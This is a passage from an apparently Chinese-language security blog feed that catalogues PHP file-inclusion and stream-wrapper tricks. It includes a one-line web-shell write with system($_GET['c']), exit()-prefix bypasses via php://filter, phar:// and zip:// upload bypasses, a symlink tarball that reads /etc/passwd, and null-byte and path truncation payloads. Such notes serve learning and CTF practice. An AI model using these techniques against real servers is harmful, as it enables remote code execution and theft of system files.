title="file_put_contents()"></a>file_put_contents()</h3><p>用来写文件进去，其中文件名参数是支持伪协议的，用于将第二个参数content进行过滤器后再写进文件里面去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents($_POST[<span class="string">'filename'</span>], <span class="string">"&lt;?php system($_GET['c']);?&gt;"</span>);</div></pre></td></tr></table></figure><h3 id="以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计"><a href="#以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计" class="headerlink" title="以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计"></a>以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计</h3><p>1、<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</div><div class="line">$content .= $_POST[<span class="string">'txt'</span>];</div><div class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</div></pre></td></tr></table></figure></p><p>写文件的时候在之前加上了exit函数，可以使用伪协议的base64，rot13，strip_tags来处理下</p><p>2、包含form-data形式下php创建的临时文件</p><p>3、文件包含函数的参数有固定的后缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$file = $_GET[&apos;file&apos;].&apos;.php&apos;;</div><div class="line">include($file);</div></pre></td></tr></table></figure></p><p>考虑使用phar://或zip://伪协议来绕过</p><p>4、压缩文件上传后再解压文件读取，可以考虑软连接的形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln -s /etc/passwd 1.txt</div><div class="line">tar -czvf test.tar.gz 1.txt</div></pre></td></tr></table></figure></p><p>5、使用伪协议php://  data:// 构造输入流</p><p>6、包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p><p>7、文件包含函数参数有其他样式的后缀，</p><pre><code>%00截断/etc/passwd%00(需要 magic_quotes_gpc=off，PHP小于5.3.4有效) 路径长度截断：/etc/passwd/././././././.[…]/./././././.(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)点号截断：/boot.ini/………[…]…………(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</code></pre><p>8、远程文件包含shell，这个在5.6下测试过了，php代码可以正常执行，但是不知为什么马运行不了，莫非是权限问题？？？好像记得ph师傅说过远程文件包含默认是禁用的。<br>9、包含日志文件</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;PHP的文件包含函数有两类，分三种：&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;file_get_contents() &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;()/&lt;span class=&quot;keyword&quot;&gt;include_once&lt;/span&gt;()  &lt;span class=&quot;keyword&quot;&gt;require&lt;/span&gt;/&lt;span class=&quot;keyword&quot;&gt;require_once&lt;/span&gt;()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;第一种用于获取文件的数据，第二种用于包含并执行代码与读取文件两种功能&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php写文件的函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;file_put_contents()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基本的思路就是用来写shell吧，不过会有各种限制，但是结合伪协议就可以简单绕过了&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="https://someonesometimes.github.io/2017/05/11/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://someonesometimes.github.io/2017/05/11/PHP伪协议/</id>
    <published>2017-05-11T13:53:23.000Z</published>
    <updated>2018-01-18T07:58:49.116Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>伪协议，个人感觉就像是对数据流的一种处理方式合集，所有以数据流作为参数的函数都应该考虑是否能够使用伪协议</p><p>现在基本就能确定，有文件包含的地方，就特别应当考虑伪协议的各种妙用</p><p>关于伪协议中的过滤器真的是要赞下，如果可以使用过滤器的话，代码检测几乎是没有任何用处的，我们可以使用过滤器进行各种各样的字符串处理，鬼知道有多少种姿势。。。</p></blockquote><a id="more"></a><p><strong>伪协议可以分为以下几类：</strong></p><ul><li>生成数据流 （上面两种在wamp 5.6php版本中都被禁用了）<ul><li>php://input</li><li>data://text/plain;base64,base64编码字符串</li></ul></li><li>数据流过滤器（测试可以看到在5.6版本的php中还没有被禁用）<ul><li>php://filter/convert.base64-encode/resource=xxx</li><li>php://filter/convert.base64-decode/resource=xxx</li><li>phar://</li><li>zip://</li></ul></li><li>远程文件访问<ul><li>http://</li><li>ftp://</li></ul></li><li>本地文件访问<ul><li>file:///</li></ul></li></ul><p>现在将逐一介绍这些伪协议以及其常用的应用场景</p><hr><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>很常用的数据流构造器，将读取提交的数据作为数据流的输入，也就是post的部分</p><h3 id="data-text-plain-base64-base编码字符串"><a href="#data-text-plain-base64-base编码字符串" class="headerlink" title="data://text/plain;base64,base编码字符串"></a>data://text/plain;base64,base编码字符串</h3><p>很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</p><h3 id="php-filter-convert-base64-encode-decode-resource-xxx"><a href="#php-filter-convert-base64-encode-decode-resource-xxx" class="headerlink" title="php://filter/convert.base64-[encode/decode]/resource=xxx"></a>php://filter/convert.base64-[encode/decode]/resource=xxx</h3><p>php://filter/convert.base64-encode/resource=</p><p>base64本来就有不少小trick，结合文件包含更是会有各种妙用，看下面这些:</p><ul><li><p>在引入resource所指的资源时，通过过滤器进行base64进行编码或解码通常用于获取文件数据时，将文件进行编码后传输</p></li><li><p>Ph师傅的文章中介绍到了这样一种很巧妙的场景，文件包含参数可控制，可上传内容为固定8种字符，于是首先使用可控制的文件包含结合php://filter读到源码，上传文件因为只能包含8种字符，可以使用base64的小trick经过n次编码将shell转换成只有8种字符的要求，然后文件包含shell中利用多次过滤器嵌套来实现多次base64解码，最终解析到shell</p><p><code>php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=.....</code></p></li></ul><h3 id="php-filter-read-write-string-rot13-strip-tags-…-resource-xxx"><a href="#php-filter-read-write-string-rot13-strip-tags-…-resource-xxx" class="headerlink" title="php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx"></a>php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</h3><p>过滤器里还支持用一些字符串处理函数进行过滤，这样选择的范围就更多了，但目前也就从p牛的博客里看到有这两个函数，其他的没有找到，strip_tags可以用来去掉字符串中的标签</p><p>注意这个过滤器是要分清read与write两个情景的，用错的话就不会产生相应的效果。在file_put_contents()中就要使用write才有过滤效果，在include(),file_get_contents()中就要使用read才有效</p><h3 id="phar-archive-zip-jpg-png…-file-txt"><a href="#phar-archive-zip-jpg-png…-file-txt" class="headerlink" title="phar://archive.[zip/jpg/png…]/file.txt"></a>phar://archive.[zip/jpg/png…]/file.txt</h3><p>经测试，其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://archive.abc/file.txt也可以运行</p><p>phar简直就是文件上传+文件包含场景中的神器：</p><p>如果文件上传后可以利用文件包含实现代码执行的话，文件上传中的后缀名过滤基本上一点用都没有了，我们其实可以上传任意后缀名的压缩文件，压缩文件里面包含着我们的任意文件，然后在文件包含的时候使用phar伪协议将我们的文件从压缩包里面提取出来</p><h3 id="zip-archive-zip-file-txt"><a href="#zip-archive-zip-file-txt" class="headerlink" title="zip://archive.zip#file.txt"></a>zip://archive.zip#file.txt</h3><p>用处和phar是一样的，应用场景也一样，但是要注意<strong> ‘#’ </strong>书写的时候要编码为%23才行，因为url的#后面是默认不传输的</p><p>还有测试上，不知为什么，同样是5.6版本，在kali虚拟机上测试通过了，但在windows下就没有通过，也许是配置的问题</p><p>### </p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;伪协议，个人感觉就像是对数据流的一种处理方式合集，所有以数据流作为参数的函数都应该考虑是否能够使用伪协议&lt;/p&gt;
&lt;p&gt;现在基本就能确定，有文件包含的地方，就特别应当考虑伪协议的各种妙用&lt;/p&gt;
&lt;p&gt;关于伪协议中的过滤器真的是要赞下，如果可以使用过滤器的话，代码检测几乎是没有任何用处的，我们可以使用过滤器进行各种各样的字符串处理，鬼知道有多少种姿势。。。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
